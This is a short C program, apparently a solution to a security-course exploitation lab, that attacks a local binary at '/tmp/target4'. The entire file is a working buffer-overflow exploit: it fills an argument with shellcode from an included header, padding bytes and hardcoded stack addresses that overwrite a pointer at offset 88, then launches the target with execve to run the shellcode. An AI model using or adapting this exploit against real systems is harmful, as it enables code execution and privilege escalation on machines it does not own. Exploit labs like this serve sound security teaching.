#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
	char arg1[93];
	char arg2[] = "0";
	char arg3[] = "0";
	
	*(unsigned *)arg1 = 0xbefffcf8;
	memcpy(arg1+4, shellcode, strlen(shellcode));
	memset(arg1+4+strlen(shellcode), 0x55, sizeof(arg1)-strlen(shellcode)-4);
	
	*(unsigned *)&arg1[88] = 0xbefffce8;

	arg1[92] = '\0';
	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
